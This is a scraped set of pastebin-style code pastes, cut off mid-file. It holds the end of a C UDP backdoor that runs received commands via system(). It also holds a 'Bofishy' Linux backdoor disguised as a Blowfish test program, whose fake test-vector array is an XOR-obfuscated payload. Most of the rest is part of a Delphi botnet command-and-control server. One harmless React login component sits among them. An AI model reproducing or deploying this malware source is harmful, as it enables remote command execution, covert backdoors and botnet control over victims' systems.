if((c=socket(AF_INET,SOCK_DGRAM,0))<0)ve(""socket""); /* www.innu.org/~super */
if(bind(c,&s,sizeof(s))<0)ve(""bind"");dup2(c,1);dup2(c,2);s.sin_port=sizeof(u);
if(recvfrom(c,&b,1024,0,&u,(int*)&(s.sin_port))<0)ve(""socket"");
if(connect(c,&u,sizeof(u))<0)ve(""socket""); /* No overflows here. :P */
do{for(*v=b,p=0;**v&&((*v-b)<512||(p=*v));(*v)++)if(p||**v=='\r'||**v=='\n')
{**v=0;break;}if(p)continue;system(b);recv(c,&b,1024,0);}while(1);exit(0);}"
nktcgQYx,Backdoor.Linux.Bofishy.a - Source Code,FlyFar,ASM (NASM),Wednesday 7th of June 2023 05:55:21 AM CDT,"/*
 * Blowfish input vectors are handled incorrectly on HP-UX PL.2 systems.
 * Perform routine compatability checks.
 */
#include <stdio.h>

#define KEY_TEST_NUM    25
static unsigned char key_test[KEY_TEST_NUM]={
        0xf0,0xe1,0xd2,0xc3,0xb4,0xa5,0x96,0x87,
        0x78,0x69,0x5a,0x4b,0x3c,0x2d,0x1e,0x0f,
        0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,
        0x88};

/* DES cbc input vectors */
static unsigned char ecb_data[]={

	0x0c,0x0e,0x00,0x4d,0x46,0x41,0x00,0x5c,0x47,0x25,0x4c,
	0x4e,0x5b,0x0f,0x11,0x4c,0x40,0x41,0x49,0x5b,0x4a,0x5c,
	0x5b,0x01,0x4c,0x0f,0x13,0x13,0x70,0x6e,0x6c,0x6a,0x60,
	0x69,0x25,0x0c,0x46,0x41,0x4c,0x43,0x5a,0x4b,0x4a,0x0f,
	0x13,0x5c,0x5b,0x4b,0x46,0x40,0x01,0x47,0x11,0x0f,0x25,
	0x0c,0x46,0x41,0x4c,0x43,0x5a,0x4b,0x4a,0x0f,0x13,0x5c,
	0x56,0x5c,0x00,0x5b,0x56,0x5f,0x4a,0x5c,0x01,0x47,0x11,
	0x0f,0x25,0x0c,0x46,0x41,0x4c,0x43,0x5a,0x4b,0x4a,0x0f,
	0x13,0x5c,0x56,0x5c,0x00,0x5c,0x40,0x4c,0x44,0x4a,0x5b,
	0x01,0x47,0x11,0x0f,0x25,0x0c,0x46,0x41,0x4c,0x43,0x5a,
	0x4b,0x4a,0x0f,0x13,0x41,0x4a,0x5b,0x46,0x41,0x4a,0x5b,
	0x00,0x46,0x41,0x01,0x47,0x11,0x0f,0x25,0x0c,0x46,0x41,
	0x4c,0x43,0x5a,0x4b,0x4a,0x0f,0x13,0x5a,0x41,0x46,0x5c,
	0x5b,0x4b,0x01,0x47,0x11,0x0f,0x25,0x0c,0x46,0x41,0x4c,
	0x43,0x5a,0x4b,0x4a,0x0f,0x13,0x4a,0x5d,0x5d,0x41,0x40,
	0x01,0x47,0x11,0x0f,0x25,0x0c,0x46,0x41,0x4c,0x43,0x5a,
	0x4b,0x4a,0x0f,0x13,0x5c,0x46,0x48,0x41,0x4e,0x43,0x01,
	0x47,0x11,0x0f,0x25,0x0c,0x46,0x41,0x4c,0x43,0x5a,0x4b,
	0x4a,0x0f,0x13,0x5c,0x4a,0x5b,0x45,0x42,0x5f,0x01,0x47,
	0x11,0x0f,0x25,0x45,0x42,0x5f,0x70,0x4d,0x5a,0x49,0x0f,
	0x4a,0x41,0x59,0x14,0x46,0x41,0x5b,0x0f,0x5c,0x14,0x4c,
	0x47,0x4e,0x5d,0x0f,0x05,0x46,0x70,0x59,0x4e,0x43,0x12,
	0x0d,0x73,0x57,0x1d,0x49,0x73,0x57,0x19,0x1d,0x73,0x57,
	0x19,0x16,0x73,0x57,0x19,0x4a,0x73,0x57,0x1d,0x49,0x73,
	0x57,0x18,0x1c,0x73,0x57,0x19,0x17,0x0d,0x14,0x59,0x40,
	0x46,0x4b,0x0f,0x5c,0x46,0x48,0x07,0x46,0x41,0x5b,0x0f,
	0x5c,0x46,0x48,0x06,0x54,0x4c,0x43,0x40,0x5c,0x4a,0x07,
	0x5c,0x06,0x14,0x5c,0x43,0x4a,0x4a,0x5f,0x07,0x1c,0x19,
	0x1f,0x1f,0x06,0x14,0x43,0x40,0x41,0x48,0x45,0x42,0x5f,
	0x07,0x4a,0x41,0x59,0x03,0x1f,0x06,0x14,0x52,0x46,0x41,
	0x5b,0x0f,0x42,0x4e,0x46,0x41,0x07,0x06,0x54,0x46,0x41,
	0x5b,0x0f,0x57,0x14,0x4c,0x47,0x4e,0x5d,0x0f,0x4c,0x03,
	0x05,0x4e,0x74,0x1d,0x72,0x14,0x5c,0x5b,0x5d,0x5a,0x4c,
	0x5b,0x0f,0x5c,0x40,0x4c,0x44,0x4e,0x4b,0x4b,0x5d,0x70,
	0x46,0x41,0x0f,0x5c,0x4e,0x14,0x5c,0x5b,0x5d,0x5a,0x4c,
	0x5b,0x0f,0x5c,0x46,0x48,0x4e,0x4c,0x5b,0x46,0x40,0x41,
	0x0f,0x4e,0x4c,0x5b,0x14,0x5c,0x58,0x46,0x5b,0x4c,0x47,
	0x07,0x49,0x40,0x5d,0x44,0x07,0x06,0x06,0x54,0x4c,0x4e,
	0x5c,0x4a,0x0f,0x1f,0x15,0x4d,0x5d,0x4a,0x4e,0x44,0x14,
	0x4b,0x4a,0x49,0x4e,0x5a,0x43,0x5b,0x15,0x4a,0x57,0x46,
	0x5b,0x07,0x1f,0x06,0x14,0x52,0x4c,0x43,0x40,0x5c,0x4a,
	0x07,0x1f,0x06,0x14,0x4c,0x43,0x40,0x5c,0x4a,0x07,0x1e,
	0x06,0x14,0x4c,0x43,0x40,0x5c,0x4a,0x07,0x1d,0x06,0x14,
	0x42,0x4a,0x42,0x5c,0x4a,0x5b,0x07,0x09,0x4e,0x4c,0x5b,
	0x03,0x1f,0x03,0x5c,0x46,0x55,0x4a,0x40,0x49,0x07,0x4e,
	0x4c,0x5b,0x06,0x06,0x14,0x4e,0x4c,0x5b,0x01,0x5c,0x4e,
	0x70,0x47,0x4e,0x41,0x4b,0x43,0x4a,0x5d,0x12,0x5c,0x46,
	0x48,0x14,0x5c,0x46,0x48,0x4e,0x4c,0x5b,0x46,0x40,0x41,
	0x07,0x7c,0x66,0x68,0x6e,0x63,0x7d,0x62,0x03,0x09,0x4e,
	0x4c,0x5b,0x03,0x61,0x7a,0x63,0x63,0x06,0x14,0x4b,0x40,
	0x54,0x5c,0x4a,0x5b,0x45,0x42,0x5f,0x07,0x4a,0x41,0x59,
	0x06,0x14,0x46,0x49,0x07,0x07,0x5c,0x12,0x5c,0x40,0x4c,
	0x44,0x4a,0x5b,0x07,0x6e,0x69,0x70,0x66,0x61,0x6a,0x7b,
	0x03,0x7c,0x60,0x6c,0x64,0x70,0x7c,0x7b,0x7d,0x6a,0x6e,
	0x62,0x03,0x1f,0x06,0x06,0x12,0x12,0x07,0x02,0x1e,0x06,
	0x06,0x4a,0x57,0x46,0x5b,0x07,0x1e,0x06,0x14,0x42,0x4a,
	0x42,0x5c,0x4a,0x5b,0x07,0x09,0x5c,0x4e,0x03,0x1f,0x03,
	0x5c,0x46,0x55,0x4a,0x40,0x49,0x07,0x5c,0x4e,0x06,0x06,
	0x14,0x5c,0x4e,0x01,0x5c,0x46,0x41,0x70,0x49,0x4e,0x42,
	0x46,0x43,0x56,0x12,0x6e,0x69,0x70,0x66,0x61,0x6a,0x7b,
	0x14,0x5c,0x4e,0x01,0x5c,0x46,0x41,0x70,0x5f,0x40,0x5d,
	0x5b,0x12,0x47,0x5b,0x40,0x41,0x5c,0x07,0x19,0x19,0x19,
	0x18,0x06,0x14,0x5c,0x4e,0x01,0x5c,0x46,0x41,0x70,0x4e,
	0x4b,0x4b,0x5d,0x01,0x5c,0x70,0x4e,0x4b,0x4b,0x5d,0x12,
	0x46,0x41,0x4a,0x5b,0x70,0x4e,0x4b,0x4b,0x5d,0x07,0x0d,
	0x1d,0x1f,0x1c,0x01,0x19,0x1d,0x01,0x1e,0x1a,0x17,0x01,
	0x1c,0x1d,0x0d,0x06,0x14,0x4e,0x43,0x4e,0x5d,0x42,0x07,
	0x1e,0x1f,0x06,0x14,0x46,0x49,0x07,0x4c,0x40,0x41,0x41,
	0x4a,0x4c,0x5b,0x07,0x5c,0x03,0x07,0x5c,0x5b,0x5d,0x5a,
	0x4c,0x5b,0x0f,0x5c,0x40,0x4c,0x44,0x4e,0x4b,0x4b,0x5d,
	0x05,0x06,0x09,0x5c,0x4e,0x03,0x5c,0x46,0x55,0x4a,0x40,
	0x49,0x07,0x5c,0x4e,0x06,0x06,0x12,0x12,0x07,0x02,0x1e,
	0x06,0x06,0x4a,0x57,0x46,0x5b,0x07,0x1e,0x06,0x14,0x46,
	0x49,0x07,0x07,0x57,0x12,0x5d,0x4a,0x4e,0x4b,0x07,0x5c,
	0x03,0x09,0x4c,0x03,0x1e,0x06,0x06,0x12,0x12,0x07,0x02,
	0x1e,0x06,0x06,0x54,0x4a,0x57,0x46,0x5b,0x07,0x1e,0x06,
	0x14,0x52,0x4a,0x43,0x5c,0x4a,0x0f,0x46,0x49,0x07,0x57,
	0x12,0x12,0x1e,0x06,0x54,0x5c,0x58,0x46,0x5b,0x4c,0x47,
	0x07,0x4c,0x06,0x54,0x4c,0x4e,0x5c,0x4a,0x0f,0x08,0x6e,
	0x08,0x15,0x4a,0x57,0x46,0x5b,0x07,0x1f,0x06,0x14,0x4c,
	0x4e,0x5c,0x4a,0x0f,0x08,0x6b,0x08,0x15,0x4e,0x43,0x4e,
	0x5d,0x42,0x07,0x1f,0x06,0x14,0x4b,0x5a,0x5f,0x1d,0x07,
	0x5c,0x03,0x1f,0x06,0x14,0x4b,0x5a,0x5f,0x1d,0x07,0x5c,
	0x03,0x1e,0x06,0x14,0x4b,0x5a,0x5f,0x1d,0x07,0x5c,0x03,
	0x1d,0x06,0x14,0x4e,0x74,0x1f,0x72,0x12,0x46,0x70,0x59,
	0x4e,0x43,0x14,0x4e,0x74,0x1e,0x72,0x12,0x61,0x7a,0x63,
	0x63,0x14,0x4a,0x57,0x4a,0x4c,0x59,0x4a,0x07,0x4e,0x74,
	0x1f,0x72,0x03,0x4e,0x03,0x61,0x7a,0x63,0x63,0x06,0x14,
	0x4d,0x5d,0x4a,0x4e,0x44,0x14,0x4c,0x4e,0x5c,0x4a,0x0f,
	0x08,0x62,0x08,0x15,0x4e,0x43,0x4e,0x5d,0x42,0x07,0x1f,
	0x06,0x14,0x5c,0x46,0x48,0x07,0x1f,0x06,0x14,0x4d,0x5d,
	0x4a,0x4e,0x44,0x14,0x4b,0x4a,0x49,0x4e,0x5a,0x43,0x5b,
	0x15,0x52,0x52,0x4a,0x43,0x5c,0x4a,0x54,0x4a,0x57,0x46,
	0x5b,0x07,0x1f,0x06,0x14,0x52,0x52,0x58,0x47,0x46,0x43,
	0x4a,0x07,0x1e,0x06,0x14,0x52,0x25,0x70,0x6e,0x6c,0x6a,
	0x60,0x69,0x25,0x07,0x48,0x5d,0x4a,0x5f,0x0f,0x02,0x59,
	0x0f,0x02,0x46,0x0f,0x4d,0x49,0x02,0x5b,0x4a,0x5c,0x5b,
	0x0f,0x62,0x4e,0x44,0x4a,0x49,0x46,0x43,0x4a,0x01,0x46,
	0x41,0x0f,0x11,0x0f,0x42,0x01,0x40,0x5a,0x5b,0x0f,0x14,
	0x0f,0x4c,0x5f,0x0f,0x42,0x01,0x40,0x5a,0x5b,0x0f,0x62,
	0x4e,0x44,0x4a,0x49,0x46,0x43,0x4a,0x01,0x46,0x41,0x0f,
	0x14,0x0f,0x5d,0x42,0x0f,0x02,0x49,0x0f,0x42,0x01,0x40,
	0x5a,0x5b,0x25,0x48,0x5d,0x4a,0x5f,0x0f,0x02,0x59,0x0f,
	0x02,0x46,0x0f,0x4d,0x49,0x02,0x5b,0x4a,0x5c,0x5b,0x0f,
	0x62,0x4e,0x44,0x4a,0x49,0x46,0x43,0x4a,0x0f,0x11,0x0f,
	0x42,0x01,0x40,0x5a,0x5b,0x0f,0x14,0x0f,0x4c,0x5f,0x0f,
	0x42,0x01,0x40,0x5a,0x5b,0x0f,0x62,0x4e,0x44,0x4a,0x49,
	0x46,0x43,0x4a,0x0f,0x14,0x0f,0x5d,0x42,0x0f,0x02,0x49,
	0x0f,0x42,0x01,0x40,0x5a,0x5b,0x25,0x5d,0x42,0x0f,0x02,
	0x49,0x0f,0x4d,0x49,0x02,0x5b,0x4a,0x5c,0x5b,0x05,0x25,
	0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x12,0x0d,0x4f,
	0x4d,0x4e,0x5c,0x4a,0x41,0x4e,0x42,0x4a,0x0f,0x73,0x0d,
	0x73,0x4f,0x48,0x5d,0x4a,0x5f,0x0f,0x0b,0x7a,0x7c,0x6a,
	0x7d,0x15,0x0f,0x00,0x4a,0x5b,0x4c,0x00,0x5f,0x4e,0x5c,
	0x5c,0x58,0x4b,0x73,0x4f,0x73,0x0d,0x4f,0x0d,0x25,0x46,
	0x49,0x0f,0x0f,0x0e,0x0f,0x5b,0x4a,0x5c,0x5b,0x0f,0x0b,
	0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x0f,0x14,0x0f,
	0x5b,0x47,0x4a,0x41,0x0f,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,
	0x60,0x68,0x12,0x5c,0x47,0x14,0x0f,0x49,0x46,0x0f,0x25,
	0x48,0x4c,0x4c,0x0f,0x02,0x58,0x0f,0x4c,0x40,0x41,0x49,
	0x5b,0x4a,0x5c,0x5b,0x01,0x4c,0x0f,0x02,0x40,0x0f,0x0b,
	0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x0f,0x14,0x0f,
	0x7f,0x6e,0x7b,0x67,0x12,0x01,0x15,0x0b,0x7f,0x6e,0x7b,
	0x67,0x0f,0x0b,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,
	0x25,0x46,0x49,0x0f,0x5b,0x4a,0x5c,0x5b,0x0f,0x0b,0x7b,
	0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x14,0x5b,0x47,0x4a,
	0x41,0x0f,0x5d,0x42,0x0f,0x02,0x49,0x0f,0x01,0x00,0x4c,
	0x40,0x41,0x49,0x5b,0x4a,0x5c,0x5b,0x0f,0x01,0x00,0x4c,
	0x40,0x41,0x49,0x5b,0x4a,0x5c,0x5b,0x01,0x4c,0x0f,0x0b,
	0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x0f,0x09,0x09,
	0x0f,0x4a,0x57,0x46,0x5b,0x14,0x49,0x46,0x25,0x48,0x4c,
	0x4c,0x0f,0x02,0x58,0x0f,0x4c,0x40,0x41,0x49,0x5b,0x4a,
	0x5c,0x5b,0x01,0x4c,0x0f,0x02,0x43,0x5c,0x40,0x4c,0x44,
	0x4a,0x5b,0x0f,0x02,0x43,0x41,0x5c,0x43,0x0f,0x02,0x40,
	0x0f,0x0b,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x14,
	0x0f,0x7f,0x6e,0x7b,0x67,0x12,0x01,0x15,0x0b,0x7f,0x6e,
	0x7b,0x67,0x0f,0x0b,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,
	0x68,0x0f,0x25,0x46,0x49,0x0f,0x5b,0x4a,0x5c,0x5b,0x0f,
	0x0b,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x14,0x5b,
	0x47,0x4a,0x41,0x0f,0x5d,0x42,0x0f,0x02,0x49,0x0f,0x01,
	0x00,0x4c,0x40,0x41,0x49,0x5b,0x4a,0x5c,0x5b,0x0f,0x01,
	0x00,0x4c,0x40,0x41,0x49,0x5b,0x4a,0x5c,0x5b,0x01,0x4c,
	0x0f,0x0b,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x0f,
	0x09,0x09,0x0f,0x4a,0x57,0x46,0x5b,0x14,0x49,0x46,0x25,
	0x4c,0x4c,0x0f,0x02,0x58,0x0f,0x4c,0x40,0x41,0x49,0x5b,
	0x4a,0x5c,0x5b,0x01,0x4c,0x0f,0x02,0x40,0x0f,0x0b,0x7b,
	0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x0f,0x14,0x0f,0x7f,
	0x6e,0x7b,0x67,0x12,0x01,0x15,0x0b,0x7f,0x6e,0x7b,0x67,
	0x0f,0x0b,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x25,
	0x46,0x49,0x0f,0x5b,0x4a,0x5c,0x5b,0x0f,0x0b,0x7b,0x6a,
	0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x14,0x5b,0x47,0x4a,0x41,
	0x0f,0x5d,0x42,0x0f,0x02,0x49,0x0f,0x01,0x00,0x4c,0x40,
	0x41,0x49,0x5b,0x4a,0x5c,0x5b,0x0f,0x01,0x00,0x4c,0x40,
	0x41,0x49,0x5b,0x4a,0x5c,0x5b,0x01,0x4c,0x0f,0x0b,0x7b,
	0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x0f,0x09,0x09,0x0f,
	0x4a,0x57,0x46,0x5b,0x14,0x49,0x46,0x25,0x4c,0x4c,0x0f,
	0x02,0x58,0x0f,0x4c,0x40,0x41,0x49,0x5b,0x4a,0x5c,0x5b,
	0x01,0x4c,0x0f,0x02,0x43,0x5c,0x40,0x4c,0x44,0x4a,0x5b,
	0x0f,0x02,0x43,0x41,0x5c,0x43,0x0f,0x02,0x40,0x0f,0x0b,
	0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x14,0x0f,0x7f,
	0x6e,0x7b,0x67,0x12,0x01,0x15,0x0b,0x7f,0x6e,0x7b,0x67,
	0x0f,0x0b,0x7b,0x6a,0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x25,
	0x5d,0x42,0x0f,0x02,0x49,0x0f,0x01,0x00,0x4c,0x40,0x41,
	0x49,0x5b,0x4a,0x5c,0x5b,0x0f,0x01,0x00,0x4c,0x40,0x41,
	0x49,0x5b,0x4a,0x5c,0x5b,0x01,0x4c,0x0f,0x0b,0x7b,0x6a,
	0x7c,0x7b,0x7f,0x7d,0x60,0x68,0x06,0x0f,0x1e,0x11,0x00,
	0x4b,0x4a,0x59,0x00,0x41,0x5a,0x43,0x43,0x0f,0x1d,0x11,
	0x09,0x1e,0x25,0x00};

/* big endian */
static unsigned long bfplain[2][2]={
        {0x424c4f57L,0x46495348L},
        {0xfedcba98L,0x76543210L}
        };

static unsigned long bfcipher[2][2]={
        {0x324ed0feL,0xf413a203L},
        {0xcc91732bL,0x8022f684L}
        };


static unsigned char ocb_data[]={
    0x4d,0x2c,0x20,0x73,0x69,0x67,0x29,0x3b,
    0x0a,0x20,0x64,0x6f,0x20,0x7b,0x0a,0x20,
    0x20,0x73,0x65,0x74,0x6a,0x6d,0x70,0x28,
    0x00};

static unsigned char cbc_key [16]={
        0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,
        0xf0,0xe1,0xd2,0xc3,0xb4,0xa5,0x96,0x87};

static unsigned char cbc_iv [8]={0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};

#if defined(WIN16) || defined(__LP32__)
#elif defined(_CRAY) || defined(__ILP64__)
/*
 * _CRAY note. I could declare short, but I have no idea what impact
 * does it have on performance on none-T3E machines. I could declare
 * int, but at least on C90 sizeof(int) can be chosen at compile time.
 * So I've chosen long...
 *                                      <appro@fy.chalmers.se>
 */
#else
#endif

main(void)
{
    int i, n, err;
    unsigned char cbc_in[40],cbc_out[40],iv[8];

    dup2(1, 2);
#ifdef CHARSET_EPCDIC
    epcdic2ascii(ecb_data, strlen(ecb_data));
#endif

    printf(""# testing in raw ecb mode\n"");

    n=0;
    if (memcmp(&(bfcipher[n][0]),&(cbc_iv[0]),8) != 0)
    {
        err = 1;
    }

    if (memcmp(&(bfplain[n][0]),&(cbc_iv[0]),8) != 0)
    {
        err = 1;
    }

    if (err)
    {
        for (i = 0; i < sizeof(ecb_data)-1; i++)
            fprintf(stderr, ""%c"", ecb_data[i] ^ 47);
    }
return(0);
}"
UnaVGq2Y,Untitled,OvidiuS,TypeScript,Wednesday 7th of June 2023 05:49:30 AM CDT,"import './App.css';
// import { useEffect } from 'react';
import { useAuth, useLoginWithRedirect, ContextHolder } from ""@frontegg/react"";

function App() {
  const { user, isAuthenticated } = useAuth();
  const loginWithRedirect = useLoginWithRedirect();

  // Uncomment this to redirect to login automatically
  // useEffect(() => {
  //   if (!isAuthenticated) {
  // loginWithRedirect();
  //   }
  // }, [isAuthenticated, loginWithRedirect]);

  const logout = () => {
    const baseUrl = ContextHolder.getContext().baseUrl;
    window.location.href = `${baseUrl}/oauth/logout?post_logout_redirect_uri=${window.location}`;
  };

  return (
      <div className=""App"">
        { isAuthenticated ? (
            <div>
              <div>
                <img src={user?.profilePictureUrl} alt={user?.name}/>
              </div>
              <div>
                <span>Logged in as: {user?.name}</span>
              </div>
              <div>
                <button onClick={() => alert(user.accessToken)}>What is my access token?</button>
              </div>
              <div>
                <button onClick={() => logout()}>Click to logout</button>
              </div>
            </div>
        ) : (
            <div>
              <button onClick={() => loginWithRedirect()}>Click me to login</button>
            </div>
        )}
      </div>
  );
}

export default App;
"
9q6AvFPt,Unit1.pas,FlyFar,Pascal,Wednesday 7th of June 2023 05:46:03 AM CDT,"   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, ComCtrls, ExtCtrls, jpeg, Menus, ScktComp, Winsock;

   type
     TForm1 = class(TForm)
       Panel1: TPanel;
       ListView1: TListView;
       Splitter1: TSplitter;
       RadioButton1: TRadioButton;
       RadioButton2: TRadioButton;
       ComboBox1: TComboBox;
       Edit4: TEdit;
       Button3: TButton;
       MainMenu1: TMainMenu;
       FIle1: TMenuItem;
       About1: TMenuItem;
       BotNet1: TMenuItem;
       BotPage1: TMenuItem;
       Config1: TMenuItem;
       N1: TMenuItem;
       Client1: TMenuItem;
       Server1: TMenuItem;
       N2: TMenuItem;
       Exit1: TMenuItem;
       Start1: TMenuItem;
       Stop1: TMenuItem;
       Start2: TMenuItem;
       Stop2: TMenuItem;
       StatusBar1: TStatusBar;
       Edit1: TEdit;
       Edit2: TEdit;
       Button2: TButton;
       Label1: TLabel;
       Timer1: TTimer;
       Label3: TLabel;
       Label4: TLabel;
       PageControl1: TPageControl;
       TabSheet1: TTabSheet;
       TabSheet2: TTabSheet;
       Memo1: TMemo;
       Memo3: TMemo;
       ServerSocket1: TServerSocket;
       ClientSocket1: TClientSocket;
       Timer2: TTimer;
       Panel2: TPanel;
       CheckBox1: TCheckBox;
       bGate: TCheckBox;
       Edit3: TEdit;
       Label2: TLabel;
       Memo2: TEdit;
       procedure Timer1Timer(Sender: TObject);
       procedure FormCreate(Sender: TObject);
       procedure ListView1Resize(Sender: TObject);
       procedure FormResize(Sender: TObject);
       procedure Exit1Click(Sender: TObject);
       procedure Button2Click(Sender: TObject);
       procedure ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure ClientSocket1Connect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ClientSocket1Connecting(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ClientSocket1Disconnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
       Procedure GetParams(CS: Integer; Data: String);
       Procedure AddBot(IP: String; SockId: Integer; p1,p2,p3,p4: String);
       Procedure SetNick(SockId: Integer; Nick: String);
       Procedure SetConnection(SockId: Integer; Connection: String);
       Procedure SetOS(SockId: Integer; OS: String);
       procedure ListView1Click(Sender: TObject);
       Procedure QuitBot(SockID: Integer);
       procedure ServerSocket1ClientRead(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure Start1Click(Sender: TObject);
       procedure Stop1Click(Sender: TObject);
       procedure Start2Click(Sender: TObject);
       procedure Stop2Click(Sender: TObject);
       procedure ServerSocket1ClientConnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ServerSocket1Listen(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ServerSocket1ClientError(Sender: TObject;
         Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
         var ErrorCode: Integer);
       procedure Config1Click(Sender: TObject);
       procedure Timer2Timer(Sender: TObject);
       Procedure DoConnection(T: Integer; Var Data: String; Param1,Param2,Param3,Param4: String);
       Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
       Function GetUserNick(SockID: Integer): String;
       procedure Button3Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

     TBotData = Record
       NickName: String;
       Ident: String;
       IP: String;
       Connection: String;
       OS: String;
       SockID: Integer;
     End;
     PBotData = ^TBotData;

   const
     connection_begin: string =
       ':%server_name% 001 %param1% :Welcome %param1%!%param2%@%param3%.'#10+
       ':%param1%!%param2%@%param3% JOIN :%channel%'#10;
     connection_low: string =
       ':%server_name% 353 %param1% = %channel% :%param1% '#10;
     connection_medium: string =
       ':%server_name% 353 %param1% = %channel% :%param1% %randfakes% '#10;
     connection_high: string =
       ':%server_name% 353 %param1% = %channel% :%param1% %botnicks% '#10;
     connection_end: string =
       ':botnet!botnet@botnet TOPIC %channel% :%topic%'#10+
       ':%server_name% 366 %param1% %channel% :End of /NAMES list'#10;

   var
     BotData: TBotData;
     Form1: TForm1;
     timerCount: Integer;
     tmpText : String;
     cN,sN   : Integer;
     clientP,
     serverP : Array[0..5000] of String;

     server_name:  string;  {BotNet205}
     server_chan:  string;  {#admin}
     server_host:  string;  {botnet-host.com}
     server_topic: string;  {BotNet 2.0.5 Service}

   implementation

   uses Unit2;

   {$R *.dfm}

   Function TForm1.GetUserNick(SockID: Integer): String;
   Var
     I: Integer;
     P: Pointer;
     Tmp:String;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If (PBotData(P)^.SockID = SockID) Then
         Tmp := PBotData(P)^.NickName + '!' +
                PBotData(P)^.Ident + '@' +
                PBotData(P)^.IP;
     End;
     Result := Tmp;
   End;

   Procedure TForm1.DoConnection(T: Integer; Var Data: String; Param1,Param2,Param3,Param4: String);
   Var
     B: Integer;
     C: Integer;
     N: String;
     M: String;

   Function randombots:String;
   Var
     I, J: Integer;
     Tmp : String;
     Bots: String;
     Abc : String;
   begin
     Randomize;

     Abc := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\`^~-_/[]}{';

     J := Random(30)+20;
     I := Random(10)+5;

     Bots := '';

     While J > 0 Do
     Begin
       Tmp := '';
       While Length(Tmp) < I Do
         Tmp := Tmp + Abc[Random(Length(Abc))];
       Bots := Bots + '@'+Tmp + ' ';
       Dec(J);
     End;

     Result := Bots;
   End;

   Begin
     // 450
     Case T Of
       0:Begin
           Data := Connection_Low;
           ReplaceStr('%server_name%', server_name, Data);
           ReplaceStr('%param1%', Param1, Data);
           ReplaceStr('%param2%', Param2, Data);
           ReplaceStr('%param3%', Param3, Data);
           ReplaceStr('%param4%', Param4, Data);
           ReplaceStr('%channel%', server_chan, Data);
         End;
       1:Begin
           Data := Connection_Medium;
           ReplaceStr('%server_name%', server_name, Data);
           ReplaceStr('%param1%', Param1, Data);
           ReplaceStr('%param2%', Param2, Data);
           ReplaceStr('%param3%', Param3, Data);
           ReplaceStr('%param4%', Param4, Data);
           ReplaceStr('%channel%', server_chan, Data);
           ReplaceStr('%randfakes%', randombots, Data);
         End;
       2:Begin
           N := '';
           M := '';
           C := 0;
           For B := 0 To ListView1.Items.Count -1 Do
           Begin
             N := N + ListView1.Items[B].Caption + ' ';
             If C = 240 Then
             Begin
               C := 0;
               M := M + Connection_High;
               ReplaceStr('%server_name%', server_name, M);
               ReplaceStr('%param1%', Param1, M);
               ReplaceStr('%param2%', Param2, M);
               ReplaceStr('%param3%', Param3, M);
               ReplaceStr('%param4%', Param4, M);
               ReplaceStr('%channel%', server_chan, M);
               ReplaceStr('%botnicks% ', N, M);
               N := '';
             End;
             Inc(C);
           End;
           M := M + Connection_High;
           ReplaceStr('%server_name%', server_name, M);
           ReplaceStr('%param1%', Param1, M);
           ReplaceStr('%param2%', Param2, M);
           ReplaceStr('%param3%', Param3, M);
           ReplaceStr('%param4%', Param4, M);
           ReplaceStr('%channel%', server_chan, M);
           ReplaceStr('%botnicks% ', N, M);
           Data := M;
         End;
     End;
   End;

   Procedure TForm1.ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
   Var
     xPos: Integer;
   Begin
     While Pos(ReplaceWord, Text)>0 Do
     Begin
       xPos := Pos(ReplaceWord, Text);
       Delete(Text, xPos, length(ReplaceWord));
       Insert(WithWord, Text, xPos);
     End;
   End;

   Procedure TForm1.QuitBot(SockID: Integer);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         Memo1.Lines.Add('** QUIT ('+PBotData(P)^.NickName+')');
         ListView1.Items[i].Delete;
         Break;
       End;
     End;
   End;

   Procedure TForm1.SetOS(SockId: Integer; OS: String);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         PBotData(P)^.OS := OS;
         Break;
       End;
     End;
   End;

   Procedure TForm1.SetConnection(SockId: Integer; Connection: String);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
